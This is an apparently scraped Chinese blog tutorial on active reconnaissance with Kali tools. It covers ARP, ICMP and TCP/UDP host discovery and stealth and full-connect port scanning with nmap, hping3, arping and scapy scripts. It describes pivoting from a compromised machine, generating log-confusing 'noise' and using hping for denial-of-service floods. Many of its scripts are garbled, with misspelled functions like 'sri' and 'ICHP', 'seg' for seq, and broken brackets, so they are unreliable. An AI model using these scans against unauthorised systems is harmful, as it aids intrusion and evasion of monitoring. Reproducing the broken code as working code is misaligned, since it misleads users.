        <link href="https://kite-007.github.io/kali-zhu-dong-xin-xi-shou-ji/">
        </link>
        <updated>2021-04-09T13:43:06.000Z</updated>
        <content type="html"><![CDATA[<p><ul class="markdownIt-TOC">
<li><a href="#kali-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">KALI 主动信息收集</a>
<ul>
<li><a href="#%E7%AE%80%E8%A6%81%E4%BB%8B%E7%BB%8D">简要介绍</a></li>
<li><a href="#%E9%98%B6%E6%AE%B5%E4%B8%80%E5%8F%91%E7%8E%B0%E4%B8%BB%E6%9C%BA">阶段一：发现主机</a>
<ul>
<li><a href="#%E4%BA%8C%E5%B1%82%E5%8F%91%E7%8E%B0arp">二层发现（ARP）</a>
<ul>
<li><a href="#arping">arping</a></li>
<li><a href="#nmap">nmap</a></li>
<li><a href="#netdiscover">netdiscover</a></li>
<li><a href="#scapy">scapy</a></li>
</ul>
</li>
<li><a href="#%E4%B8%89%E5%B1%82%E5%8F%91%E7%8E%B0icmp">三层发现（ICMP）</a>
<ul>
<li><a href="#ping">Ping</a></li>
<li><a href="#traceroute">traceroute</a></li>
<li><a href="#scapy-2">scapy</a></li>
<li><a href="#nmap-2">nmap</a></li>
<li><a href="#fping">fping</a></li>
<li><a href="#hping">hping</a></li>
</ul>
</li>
<li><a href="#%E5%9B%9B%E5%B1%82%E5%8F%91%E7%8E%B0tcpudp">四层发现（TCP/UDP）</a>
<ul>
<li><a href="#tcp%E5%8F%91%E7%8E%B0">TCP发现</a>
<ul>
<li><a href="#scapy-3">scapy</a></li>
</ul>
</li>
<li><a href="#udp%E5%8F%91%E7%8E%B0">UDP发现</a>
<ul>
<li><a href="#scapy-4">scapy</a></li>
<li><a href="#nmap-3">nmap</a></li>
<li><a href="#hping3">hping3</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><a href="#%E9%98%B6%E6%AE%B5%E4%BA%8C%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F">阶段二：端口扫描</a>
<ul>
<li><a href="#udp%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F">UDP端口扫描</a>
<ul>
<li><a href="#scapy-5">scapy</a></li>
<li><a href="#nmap-4">nmap</a></li>
</ul>
</li>
<li><a href="#tcp%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F">TCP端口扫描</a>
<ul>
<li><a href="#%E9%9A%90%E8%94%BD%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F">隐蔽端口扫描</a>
<ul>
<li><a href="#scapy-6">Scapy</a></li>
<li><a href="#nmap-5">nmap</a></li>
<li><a href="#hping3-2">hping3</a></li>
</ul>
</li>
<li><a href="#%E5%85%A8%E8%BF%9E%E6%8E%A5%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F">全连接端口扫描</a>
<ul>
<li><a href="#scapy-7">scapy</a></li>
<li><a href="#nmap-6">nmap</a></li>
<li><a href="#dmitry">dmitry</a></li>
<li><a href="#nc">nc</a></li>
</ul>
</li>
<li><a href="#%E5%83%B5%E5%B0%B8%E6%89%AB%E6%8F%8F">僵尸扫描</a>
<ul>
<li><a href="#scapy-8">scapy</a></li>
<li><a href="#nmap-7">nmap</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><a href="#%E9%98%B6%E6%AE%B5%E4%B8%89%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F">阶段三：服务扫描</a>
<ul>
<li><a href="#banner">Banner</a>
<ul>
<li><a href="#nc-2">nc</a></li>
<li><a href="#socker">socker</a></li>
<li><a href="#dmitry-2">dmitry</a></li>
<li><a href="#namp">namp</a></li>
<li><a href="#amap">amap</a></li>
</ul>
</li>
<li><a href="#%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AF%86%E5%88%AB">操作系统识别</a>
<ul>
<li><a href="#%E4%B8%BB%E5%8A%A8%E5%BC%8F%E6%89%AB%E6%8F%8F">主动式扫描</a>
<ul>
<li><a href="#scapy-9">scapy</a></li>
<li><a href="#nmap-8">nmap</a></li>
<li><a href="#xprobe2">xprobe2</a></li>
</ul>
</li>
<li><a href="#%E8%A2%AB%E5%8A%A8%E5%BC%8F%E6%89%AB%E6%8F%8F">被动式扫描</a>
<ul>
<li><a href="#p0f">p0f</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#snmp%E6%89%AB%E6%8F%8F">SNMP扫描</a>
<ul>
<li><a href="#onesixtyone">onesixtyone</a></li>
<li><a href="#snmpwalk">snmpwalk</a></li>
<li><a href="#snmpcheck">snmpcheck</a></li>
</ul>
</li>
<li><a href="#smb%E6%89%AB%E6%8F%8F">SMB扫描</a>
<ul>
<li><a href="#nmap-9">nmap</a></li>
<li><a href="#nbtscan">nbtscan</a></li>
<li><a href="#enum4liunx">enum4liunx</a></li>
</ul>
</li>
<li><a href="#smtp%E6%89%AB%E6%8F%8F">SMTP扫描</a>
<ul>
<li><a href="#nc-3">nc</a></li>
<li><a href="#nmap-10">nmap</a></li>
<li><a href="#smtppy">smtp.py</a></li>
</ul>
</li>
<li><a href="#%E9%98%B2%E7%81%AB%E5%A2%99%E8%AF%86%E5%88%AB">防火墙识别</a>
<ul>
<li><a href="#scapy-10">scapy</a></li>
<li><a href="#nmap-11">nmap</a></li>
</ul>
</li>
<li><a href="#%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E8%AF%86%E5%88%AB">负载均衡识别</a>
<ul>
<li><a href="#lbd">lbd</a></li>
</ul>
</li>
<li><a href="#waf%E8%AF%86%E5%88%AB">WAF识别</a>
<ul>
<li><a href="#wafw00f">wafw00f</a></li>
<li><a href="#nmap-12">nmap</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#nmap%E5%8F%82%E6%95%B0%E4%BD%BF%E7%94%A8">NMAP参数使用</a></li>
</ul>
</li>
</ul>
( KALI 主动信息收集)</p>
<h1 id="kali-主动信息收集">KALI 主动信息收集</h1>
<h2 id="简要介绍">简要介绍</h2>
<ul>
<li>被动信息收集原则，不直接与目标交互进行访问。而主动信息大部分反之。</li>
<li>主动信息收集过程对目标的端口进行探测，搜集服务信息（主机，域名，IP等等）。</li>
<li>这样做会无法避免在目标机上面留下访问痕迹。</li>
<li>为了避免这种情况：
<ul>
<li>通常会使用第三方电脑进行探测，因为可以使用代理进行混淆视听，但是这些第三方电脑也还是有被封杀IP的概率。</li>
<li>有两种隐藏的方法，一种就是藏着，另一种则是发送大量垃圾信息，迷惑目标系统的日志分析功能以及抓包分析系统，这种用来迷惑的垃圾信息称之为噪声。</li>
</ul>
</li>
</ul>
<h2 id="阶段一发现主机">阶段一：发现主机</h2>
<h3 id="二层发现arp">二层发现（ARP）</h3>
<ul>
<li>识别网络中存在的主机，是潜在攻击的目标。这里所说的层为OSI七层网络。</li>
<li>二层中基于数据链路层ARP协议，具有扫描速度快，可靠的优点，但是不可路由，一但需要进行到路由的下一跳，就会无法进行。</li>
</ul>
<h4 id="arping">arping</h4>
<pre><code class="language-shell">arping 1.1.1.1 -c 1
# 与ping命令差不多，但是发送的是arp包
# arping 后面紧跟目标IP，-c表示发送几次arp包，如果不加参数则会一直发送。
# 如果存在该目标，就会收到返回信息，像ping命令一样。

-d 参数
# 发现重复的响应，能够发现两个不同的MAC地址拥有同样一个IP这种情况，（不同的地址，相同
# 的IP）如果出现了这种情况，并且真的是两个不同的地址相同的IP，存在ARP地址欺骗，欺骗网
# 关，可能会实施中间人攻击，纂改发送的数据，窃取流量等等，这时可以根据MAC地址，在交换
# 机端口上，如果是有线网络的话，通过交换机端口查ARP表，去寻找这个人的位置，连接的是哪
# 个交换机端口，如果是无线环境的话，定位起来会比较难。

arping -c 1 1.1.1.1 | grep &quot;bytes from&quot; | cut -d&quot; &quot; -f 5 | cut -d &quot;(&quot; -f 2 | cut -d&quot;)&quot; -f 1
# 发送arp包到此IP，grep只显示“bytes from”的结果，之后cut -d显示通过空格差分，-f显示第五列的内容。
</code></pre>
<p>arping方便快捷但是难以发现一个网段下的主机，因为是命令行工具，所以可以尝试使用脚本来实现。</p>
<pre><code class="language-shell"># arping1.sh
# 通过arping对一个网段下的主机及全部网络进行发现

#!/bin/bash
# 脚本使用/bin/bash来进行解释

if ('$#' -ne 1); then
# $#表示该脚本可以跟随增加一些参数，如果这里增加的参数的数量不等于一，就会回显一下三个echo

	echo&quot;Usage /arping.sh [interfacel&quot;
	# 告诉正确使用方法 /arping.sh 后加网卡接口 例如：
	echo&quot;Example /arping.sh eth0&quot;

	echo&quot;Example will perform an ARPscan of the local subnet to which eth0 is assigned&quot;
	exit
fi

interface=$1
# 参数定义等于$1,输入的值

prefix=$(ifconfig $interface | grep 'inet' | cut -d ':' -f 2 | cut -d ' ' -f 10 | cut -d '.' -f 1-3)
# 取interface网卡前缀，网络地址，192.168.200.0，这里第二个cut那里，如果你的输出是顶格的话，就将10改为2，如果没有顶格，可以进行试试，我的是10

for addr in $(seq 1 254);do
	arping -c 1 $prefix.$addr | grep &quot;bytes from&quot; | cut -d &quot; &quot; -f 5 | cut -d&quot;(&quot; -f 2 | cut -d&quot;)&quot; -f 1 &gt;&gt; addr.txt
	
done
</code></pre>
<pre><code class="language-shell"># arping2.sh
# 通过arping对一个网段下的主机及全部网络进行发现验证是否存活

#!/bin/bash
# 脚本使用/bin/bash来进行解释

if ('$#' -ne 1); then
# $#表示该脚本可以跟随增加一些参数，如果这里增加的参数的数量不等于一，就会回显一下三个echo

	echo&quot;Usage /arping.sh [interfacel&quot;
	# 告诉正确使用方法 /arping.sh 后加网卡接口 例如：
	echo&quot;Example /arping.sh eth0&quot;

	echo&quot;Example will perform an ARPscan of the local subnet to which eth0 is assigned&quot;
	exit
fi

file=$1
for addr in $(cat $file); do
	arping -c 1 $addr | grep &quot;bytes from&quot; | cut -d &quot; &quot; -f 5 | cut -d &quot;(&quot; -f 2 | cut -d &quot;)&quot; -f 1
	
done

</code></pre>
<h4 id="nmap">nmap</h4>
<ul>
<li>最需熟练掌握的工具之一。默认情况下，如果只跟IP地址的话，那麽nmap会对IP进行一系列的扫描，首先发现是否存在，其次对常用端口进行扫描。现在只做二层发现，不做端口扫描。也不仅仅只发送arp包，还有dns（通过地址解析主机名，扫描公网，内网）等等</li>
</ul>
<pre><code class="language-shell">nmap 1.1.1.1-255 -sn
nmap 1.1.1.0/24 -sn
# -sn参数，让nmap只做ping扫描
# 支持地址段，不用写脚本，而且比arping快

namp -iL addr.txt -sn
# 也可以实现上述arping2功能，查询地址列表中存活的主机
</code></pre>
<h4 id="netdiscover">netdiscover</h4>
<ul>
<li>
<p>可实现主动发现，也可实现被动发现，有线，无线环境下都可以使用，使用arp协议。</p>
</li>
<li>
<p>主动发现：</p>
<ul>
<li>与上述的工作原理基本相同，都是向IP发送arp包，如果目标有返回信息的话，就可以判断目标是活着的。</li>
</ul>
</li>
</ul>
<pre><code class="language-shell">netdiscover -i eth0 -r 192.168.200.0/24
netdiscover -l addr.txt
-i 指定收获信息的网卡
-r 指定ip网段
</code></pre>
<ul>
<li>被动发现：
<ul>
<li>不主动发送arp包，在网络里面侦听，将自己的网卡置为混杂模式，收取非本网卡的IP地址，非本网卡的mac地址的包，而arp协议的机制又是进行广播的。</li>
</ul>
</li>
</ul>
<pre><code class="language-shell">netdiscover -p
</code></pre>
<h4 id="scapy">scapy</h4>
<ul>
<li>
<p>可以作为Python库进行调用，也可以作为工具使用，抓包，分析，对网络流量进行操作。</p>
</li>
<li>
<p>实际上使python中的一个模块，可以用scapy库写各种扫描脚本的程序。</p>
</li>
<li>
<p>Scapy ARP函数使用</p>
</li>
</ul>
<pre><code class="language-shell">ARP()发现
1. ARP().disply()
展示ARP函数参数列表，像MSF里的info
# 默认字段
###[ ARP ]###
  hwtype= 0x1 # 硬件类型:以太网1（eth0）
  ptype= IPv4 # 协议类型:IPv4
  hwlen= None # 硬件地址长度，通常为6
  plen= None # 协议地址长度，通常为4
  op= who-has # ARP查询包，操作，进行查询，以源来发送
  hwsrc= 00:0c:29:dd:9e:44 # 源
  psrc= 192.168.200.147 # 源
  hwdst= 00:00:00:00:00:00 # 目标
  pdst= 0.0.0.0 # 目标
# 通常是使用函数时会应定义变量，来进行调用，使arp得以继承ARP()
arp=ARP()
所以现在
arp.display()=ARP().display()

# 像MSF那样给默认字段赋值
arp.pdst()=&quot;192.168.200.1&quot;

# 发送包,如果存在则会收到返回的响应包
sr1(arp)
# 后面的&lt;Padding ...&gt;部分是包未达到最小以太网包大小的要求，加上以达到要求
# 也可以将包赋给一个变量
answer=sr1(arp)
answer.display()

#上面发送包也可以写成
sr1(ARP(pdst=&quot;192.168.200.1&quot;))
# 如果发送的包不存在，则scapy会一直发包，直到存在该IP为止
</code></pre>
<ul>
<li>使用python脚本实现，程序会默认发送两个包</li>
</ul>
<pre><code class="language-python"># arp1.py

#!/usr/bin/python
# 声明代码解释器，生成字节码，通过引擎调用字节码进行运行

import logging
import subprocess
# 实现系统命令的调用
# 导入日志模块(日志记录)，导入库(系统指令)
logging.getLogger(&quot;scapy.runtime&quot;).setLevel(logging.ERROR)
# 运行时，日志记录等级设置
from scapy.all import*

if len(sys.argv)!=2:
# 脚本可以跟参数，如果连命令带参数不等于2，不是两块的话，就执行以下
 print&quot;Usage ./arp_disc.py (interface)&quot;
 print&quot;Example ./arp_disc.py eth0&quot;
 print&quot;Example will perform an ARP scan of the local subnet to which eth0 is assigned&quot;
 sys.exit()
	
interface=str(sys.argv[1])
# 将接收到的参数转换为字符串类型

ip=subprocess.check_output(&quot;ifconfig &quot;+interface+&quot; | grep 'inet' | cut -d ':' -f 10 | cut -d ' ' -f 10&quot;,shell=True).strip()
# 运行shell得到ip
prefix=ip.split('.')(O)+'.'+ip.split('.')(1)+'.'+ip.split('.')(2)+'.'
# 将ip进行分割，再拼接

for addr in range(0,255):
 answer = sr1(ARP(pdst=prefix+str(addr)),timeout=0.1,verbose=0)
	# timeout 超时停止发送，verbose 发送显示错误报告，1为显示，0不显示
 if answer == None:
  pass
 else:
  print prefix+str(addr)
</code></pre>
<ul>
<li>调用IP地址列表文件</li>
</ul>
<pre><code class="language-python"># arp2.py

#!/usr/bin/python
# 声明代码解释器，生成字节码，通过引擎调用字节码进行运行

import logging
logging.getLogger(&quot;scapy.runtime&quot;).setLevel(logging.ERROR)
# 运行时，日志记录等级设置
from scapy.all import*

if len(sys.argv)!=2:
# 脚本可以跟参数，如果连命令带参数不等于2，不是两块的话，就执行以下
 print&quot;Usage - ./arp_disc.py (interface)&quot;
 print&quot;Example - ./arp_disc.py eth0&quot;
 print&quot;Example will perform an ARP scan of the local subnet to which eth0 is assigned&quot;
 sys.exit()
	
filename=str(sys.argv[1])
file=open(filename,'r')
# 打开读取内容，一行一次

for addr in file:
 answer = sr1(ARP(pdst=addr.strip()),timeout=0.1,verbose=0)
 if answer == None:
  pass
 else:
  print addr.strip()
</code></pre>
<ul>
<li>二层发现的使用：通常来说，在渗透测试目标系统时，一般在已经控制了一台目标系统机器，取得了这台机器的控制权，要继续对目标系统的内网进行进一步渗透，以已经控制的机器作为跳板，进一步渗透，可以先使用二层发现，来发现目标系统的内网中还存活哪些机器主机，可以进行进一步渗透。充分证明控制了一台机器的危害，一般机器上面没有nmap，但是可能会有arping，netdiscover或者python环境来进行二层扫描。</li>
</ul>
<h3 id="三层发现icmp">三层发现（ICMP）</h3>
<ul>
<li>三层协议，基于TCP/IP层，IP，icmp协议（Internet控制管理协议：主要用来做路径发现，做一个探测，根据相应结果来返回目标主机的一个状态的一种协议），这里以icmp为主，相比较二层速度比较慢，经常被边界防火墙过滤，也可能会出现目标机器宕机，但是扫描发现它在线的误判情况。</li>
<li>优点：可以发现路由，理论上可以发现上世界上所有的目标主机，前提是目标机需要接收所发送的icmp包，像被防火墙拦截过滤设备数据包等等，就可能会出现一种发送了数据包，但是目标机器没有返回icmp的响应包，这样，扫描工具就有可能会出现一个该主机不在线的一个错误判断。这是扫描无法避免的一个问题。</li>
</ul>
<h4 id="ping">Ping</h4>
<ul>
<li>Ping命令使用icmp的其中两种类型数据包，icmp协议会根据包头的type字段有0-15个定义，每种定义都表示一种包的类型，用途也不一样，在发ping包的时候，发送的实际上是icmp的type8的数据包，接收到ping包的机器，如果没有防火墙过滤，接收到正常响应的话，就会返回一个type0的数据包。</li>
</ul>
<pre><code class="language-shell">ping 192.168.200.1 -c 5
# 发送五个包就结束date：特殊字符加数字

ping -R 1.1.1.1
# 请求离主机比较远的目标地址
</code></pre>
<p>ping实现ping网段的脚本</p>
<pre><code class="language-shell">#！/bin/bash
if [&quot;$#&quot; -ne 1];then
	echo &quot;Usage - ./yarping.sh [interface]&quot;
	echo &quot;Example - ./arping.sh etho&quot;
	echo &quot;Example will perform an ARP scan of the local subnet to which etho is assigned&quot;
	exit
fi

interface=$1
prefix=$(ifconfig $interface | grep 'inet addr' | cut -d ':' -f 2 | cut -d ' ' -f 1 | cut -d  '.' -f 1-3)
for addr in $(seg 1 254):do
	arping -c 1 Sprefix.$addr | grep &quot;bytes from&quot; | cut -d'' -f 5 | cut -d &quot;(&quot; -f 2 | cut -d &quot;)&quot; -f 1
done
</code></pre>
<h4 id="traceroute">traceroute</h4>
<ul>
<li>探测目标机器，不仅可以发现目标机器在线或是不在线的状态，还可以发现从主机到目标机器中间经历了多少跳的路由。</li>
</ul>
<pre><code>traceroute www.baidu.com
# 发出icmp数据包，相应的也是icmp数据包，这些序号表示从主机到目标机器中间经历了多少跳的路由。
# * * * 表示边界路由设备的拦截过滤
# traceroute与ping不同，他会先设置ttl（Time-to-live）的值为1，（一般的Linux数据包的ttl值默认开始为64，每经过一跳，ttl值减一）当包到达第一个路由器，他的值会减一，当路由器发现这个包的值变成了0之后会返回一个数据包，告诉ttl的值已经到达边界范围了。
</code></pre>
<h4 id="scapy-2">scapy</h4>
<ul>
<li>scayp也可以调用icmp协议实现ping命令，三层发现。</li>
<li>先定义ip包头，再定义icmp包头在将两者组合起来，形成icmp的ping包。</li>
</ul>
<pre><code># 定义的两个包头，再将两个包头进行组合，形成ping包
i=IP()
p=ICMP()
ping=(i/p)

# 查看ping包默认参数，设置目标地址,src源地址会自动设置
ping.display()
ping[IP].dst=&quot;192.168.200.2&quot;

# 发送,受到响应包，查看包的内容
a=sr1(ping)
a.display()

# 以上命令使用一行显示
sr1(IP(dst=&quot;192.168.200.2&quot;)/ICMP(),timeout=0.1)
# 与之前相同，如果不存在ip地址，则发送包会一直进行等待，需要加上超时命令。
</code></pre>
<ul>
<li>使用以上原理的python脚本</li>
</ul>
<pre><code class="language-python">#！/usr/bin/python

import logging
import subprocess
logging getLogger(&quot;scapy.runtime&quot;).setLevel(logging.ERROR)
from scapy.all import*

if len(sys.argv)!= 2:
 print &quot;Usage - ./pinger.py [/24 network address]&quot;
 print &quot;Exanple - ./pinger.py 172.16.36.0&quot;
 print &quot;Example will perform an ICHP scan of the 172.16.36.0/24 range&quot;
 sys.exit()
    
address =str(sys.argv[1])
prefix=address.split('.')[0] +'.'+address.split('.') [1]+'.'+address.split('.')[]2+'.'

for addr in range(1,254):
 a=sr1(IP(dst=prefix+str(addr)/ICHP().timeout=0.1,verbose=0)
if a == None:
 pass
else:
 print prefix+str(addr)
</code></pre>
<pre><code class="language-python">#！/usr/bin/python

import logging
import subprocess
logging getLogger(&quot;scapy.runtime&quot;).setLevel(logging.ERROR)
from scapy.all import*

if len(sys.argv)!=2:
 print&quot;Usage - ./pinger.py [/24 network address]&quot;
 print&quot;Exanple - ·/pinger.py 172.16.36.0°
 print&quot;Exanplewill performanICHP scanofthe 172.16.36.0/24 range&quot; 	sys.exit()

filename=str(sys.argv[1])
file=open(filenane,'r')

for addr in file:
 a=sr1(IP(dst=addr.strip())/ICMP().timeout=0.1,verbase=0)
 if a == None:
  pass
 else:
  print addr.strip0
</code></pre>
<h4 id="nmap-2">nmap</h4>
<ul>
<li>使用nmap进行三层发现</li>
<li>使用综合的多种技术对目标进行探测（二层arp，三层icmp，四层tcp）</li>
</ul>
<pre><code># 如果目标ip是在本网段的话，nmap会发送arp包，如果不在同一网段的话则会发送icmp包
nmap 1.1.1.1 -sn
# Type 13 获取目标操作系统时间戳
</code></pre>
<h4 id="fping">fping</h4>
<ul>
<li>类似于ping 比它强大</li>
<li>ping不支持对地址段进行扫描，fping支持</li>
</ul>
<pre><code class="language-shell">fping 1.1.1.1 -c 1
fping -g 1.1.1.100 1.1.1.200
fping -g 1.1.1.0/24
fping -f addr.txt

-c 发送几个包
-g 支持地址段
-f 支持地址列表
</code></pre>
<h4 id="hping">hping</h4>
<ul>
<li>比较强大，完成tcp ip协议包头，两者所有参数在该hping命令中都有涉及，可以设计不同的字段组合，实现类似于Scapy对IP包头每一个字段的内容进行设置，可进行三层发现，可对tcp服务器进行压力测试，发送大量的包，特殊定制的包的内容(拒绝服务攻击)。</li>
</ul>
<pre><code>hping3 192.168.200.2 --icmp -c 2

# 如果对不存在的地址进行ping报的话则得不到响应

一行脚本：
for addr in $(seq 1 254); do hping3 1.1.1.$addr --icmp -c 1 &gt;&gt; handle.txt &amp; done

//测试。查看
for addr in $(seq 1 254); do hping3 192.168.200.$addr --icmp -c 1 &gt;&gt; handle.txt &amp; done

cat handle.txt | grep len
</code></pre>
<h3 id="四层发现tcpudp">四层发现（TCP/UDP）</h3>
<ul>
<li>优点：可以进行路由，结果比较可靠，不太可能被防火墙过滤，甚至可以发现所有端口都关闭的主机。</li>
<li>全端口扫描速度慢，基于状态检测过滤的防火请可能会被过滤掉。</li>
<li>使用tcp/udp协议对端口进行探测，根据探测端口相应的结果判断发现IP是否在线，可靠性更高。</li>
<li>为什么不太可能被防火墙过滤：防火墙也可以看作是一种打开端口的服务，即使端口关闭，根据探测边界防火墙的结果也能判断该主机的状态。</li>
<li>TCP
<ul>
<li>正常过程是发送SYN包，目标返回SYN/ACK，在发送ACK建立连接，之后可以向目标发送资源请求，目标服务器就会响应数据包，接着确认，发送下一个包，如此往返，比较可靠，如果目标端口是关闭状态则会返回RST包。</li>
<li>如果没有建立连接，则直接向目标发送ACK包，在未建立连接状态下，基于TCP协议，目标会向主机发送一个RST，请求终端ACK请求，一般都会发送。</li>
</ul>
</li>
<li>UDP
<ul>
<li>ICMP端口不可达，一去不复返。可达则，一去不复返。</li>
<li>不建立连接，向目标发送包，不需要确认，结果没有TCP准确。</li>
<li>如果目标的端口未开放，则目标会返回一个端口（ICMP）不可达的数据包。确认目标在线。</li>
</ul>
</li>
</ul>
<h4 id="tcp发现">TCP发现</h4>
<h5 id="scapy-3">scapy</h5>
<ul>
<li>在TCP包中设置flag位为ACK，发送向一个目标IP，通过目标的响应，来确认目标是否在线，如果目标返回一个RST则在线，如果目标不发送任何数据，则不在线。</li>
</ul>
<pre><code class="language-shell"># 定义三层包，将三层包与四层包结合起来
i=IP()
t=TCP()
r=(i/t)

# 查看发送内容，设置目标
r.display()
r[IP].dst=&quot;192.168.200.2&quot;

# 设置TCP包的flag内容为ACK，发送,查看
r[TCP].flags=&quot;A&quot;
a=sr1(r)
a.display()
# dport= http 意思默认为80端口

# 上述用一行表示：
a=sr1(IP(dst=&quot;1.1.1.1&quot;)/TCP(dport=80,flags=&quot;A&quot;),timeout=1)
</code></pre>
<p>对应脚本ACK_Ping.py</p>
<pre><code class="language-python">#!/usr/bin/python

import logging
logging.getLogger(&quot;scapy.runtime&quot;).setLevel(logging.ERROR)
from scapy.all import*

if len(sys.argv)!=2;
 print &quot;Usage - ./ACK Ping.py [/24 network address]&quot;
 print &quot;Example - ./ACK Ping.Py 1.1.1.6°
 print &quot;Example will perfors a TCP ACK ping scan of the 1.1.1.0/24 ran
 sys.exit()

address =str(sys.argv[1])
prefix=address.split('.')[0]+'.'+address.split('.')[1]+'.'+address.split('.')[2]+'.'

for addr in range(1,254):
 response=sr1(IP(dst=prefix+str(addr))/TCP(dport=2222,flags='A'ltimeout=0
  try:
    if int(response[TCP].flags)==4;
     print prefix+str(addr)
  except:
   pass
</code></pre>
<h4 id="udp发现">UDP发现</h4>
<h5 id="scapy-4">scapy</h5>
<ul>
<li>设置UDP包，选择一个不常用的端口（未开放）来发送。</li>
</ul>
<pre><code class="language-shell"># 定义三层包，将三层包与四层包结合起来
i=IP()
u=UDP()
r=(i/u)

# 查看发送内容，设置目标
r.display()
r[IP].dst=&quot;192.168.200.2&quot;

# 更改默认端口53为不常用端口7345
r[UDP].dport=7345

# 设置TCP包的flag内容为ACK，发送,查看
r[UDP].flags=&quot;A&quot;
a=sr1(r)
a.display()
# dport= http 意思默认为80端口

# 上述用一行表示：
a=sr1(IP(dst=&quot;1.1.1.1&quot;)/UDP(dport=7345),timeout=1)
</code></pre>
<pre><code class="language-python">#!/usr/bin/python

import logging
logging.getLogger(&quot;scapy.runtime&quot;).setLevel(logging.ERROR)
from scapy.all import*

if len(sys.argv) !=2:
 print&quot;Usage - ./ACK Ping.py [/24network address]&quot;
 print&quot;Example - ./ACK Ping.py 1.1.1.6&quot;
 print&quot;Example willperform a TCP ACKping scan of the 1.1.1.0/24 range&quot;
 sys.exit()

address=str(sys.argv[1])
prefix=address.split('.')[0]+'.'+address.split('.')[1]+'.'+address.split('.')[2]+'.'

for addr in range(1,254):
 response=sri(IP(dst=prefix+str(addr)/UDP(dport=33333),timeout=0.1,verbose=0)
 try:
  if int(response[IP]proto)==1:
   print prefix+str(addr)
 except:
  pass
</code></pre>
<h5 id="nmap-3">nmap</h5>
<ul>
<li>nmap实现四层主机发现，(三四层)</li>
</ul>
<pre><code class="language-shell">nmap 1.1.1.1-254 -PU53 -sn
# -PU端口:udp方式

nmap 1.1.1.1-254 -PA80 -sn
# -PA端口:tcp的ack方式

# -PS：SYN方式，
# —PY：SCTP方式（uip上的协议）
# -PE：ICMP的ping包
# -PO：IP的ping包
# -PP：时间戳
# -PM：请求目标netmask

nmap -iL iplist.txt -PA80 -sn
</code></pre>
<h5 id="hping3">hping3</h5>
<ul>
<li>如果扫描在同一网段下，则默认为二层主机扫描，为ARP协议。</li>
</ul>
<p>基于tcp</p>
<pre><code class="language-shell">hping 1.1.1.1 -c 1
发送的包flag都是0，如果返回ACK，RST则发现目标主机

#hping3 tcp shell脚本

</code></pre>
<p>基于udp</p>
<pre><code class="language-shell">hping3 --udp 1.1.1.1 -c 1

# hping3 udp shell脚本

</code></pre>
<h2 id="阶段二端口扫描">阶段二：端口扫描</h2>
<p>​     端口号后对应各个应用程序，应用程序的漏洞则是通过端口来体现出来的，后续渗透测试也是通过端口来实现的。所以找到IP的下一步就是对端口进行探测，具体进行攻击。</p>
<p>​    端口扫描发现tcp以及udp的端口</p>
<h3 id="udp端口扫描">UDP端口扫描</h3>
<p>​    与之前主机发现原理相同。不同的是主机IP已经被发现了，现在就有两种情况，端口开放以及端口未开放。可以继续使用scapy，但发现阶段是收到端口不可达，则认为主机存在，现阶段是需要返回的ICMP端口的情况都是关闭的，而没有响应的则认为是开放的，与前那刚好相反。</p>
<h4 id="scapy-5">scapy</h4>
<p>​    与之前的三层大致相同（如果了解UDP的应用层包结构有用帮助）</p>
<pre><code class="language-python">sr1(IP(dst=&quot;1.1.1.1&quot;)/UDP(dport=53),timeout=1,verbose=1)
./udp_scan.py 1.1.1.1 1 100

# 存在个别特例的特殊情况

#! /usr/bin/python

import logging
logging.getLogger(&quot;scapy.runtime&quot;).setLevel(logging.ERROR)
from scapy.all import *
import time
import sys

if len(sys.argv)!=4:
 print&quot;Usage - ./udp_scan.py [Target-IP] [First Port] [Last Port]&quot; 
 print&quot;Example - ./udp_scan.py 10.0.0.5 1 100&quot;
 print&quot;Example will UDP port scan ports 1 through 100 on 10.0.0.5&quot;
 sys.exit()

ip= sys.argv[1】
start=int(sys.argv[2])
end=int(sys.argv([3])

for port in range(start.end):
 a=sr1(IP(dst=ip)/UDP(dport=port),timeout=5,verbose=0)
 time.sleep(1)
 if a == None:
  print port
 else:
  pass
</code></pre>
<h4 id="nmap-4">nmap</h4>
<p>​    基于nmap的udp的端口扫描</p>
<pre><code class="language-shell">nmap -sU 1.1.1.1
# -PU端口:udp方式
# 不指定端口则有默认1000个参数
# 端口关闭：ICMP host-unreachable

nmap 1.1.1.1 -sU -p 53
nmap -iL iplist.txt -sU -p 1-200
# 回车能够查看扫描进度
</code></pre>
<h3 id="tcp端口扫描">TCP端口扫描</h3>
<p>​    udp端口扫描比较简单，只有一种状态，但tcp端口存在各种各样（链接，半连接等等）的状态，比较复杂。</p>
<p>​    基本的tcp扫描是基于tcp三次握手实现全连接扫描，基于链接的建立的协议的扫描，1.发送SYN 2.返回SYN、ACK 3. 发送ACK。发送大量请求，容易触发警报。<br>
​    还有一些隐蔽的扫描的手段，不建立握手，不发送SYN包。不建立连接，不会体现在应用层，不会在应用层，网络层日志文件里面被发现。<br>
​    可以手动写py脚本来实现僵尸扫描，更加隐蔽，基本不与目标系统产生直接的会话进程，就能判断目标系统的端口是否开放，极其的隐蔽。</p>
<p>​    隐蔽扫描，只发送syn包，如果返回syn+ack则可以判断端口为开放状态，如果不开放，则返回rst，因为没有建立完整的tcp连接，目标系统的应用层的日志记录不会记录扫描的行为。但是网络层上面可能会有一些记录。<br>
​    所有的tcp扫描的方式都是根据三次握手的变化来判断目标端口的状态。</p>
<p>​    僵尸扫描，国内资料对此扫描的描述比较简单——这是一种极其隐蔽的扫描方式，条件比较苛刻，不经常使用，不进行介绍。</p>
<ul>
<li>
<p>实现条件： 实施条件苛刻。<br>
​    条件一：扫描的发起方与被扫描的目标服务器必须是可以实现地址伪造。多年前，在互联网上可以实现伪造地址ip实施DDOS攻击。近些年，互联网的边界路由器纷纷加入了防地址伪造过滤的策略，目前实施比较困难。<br>
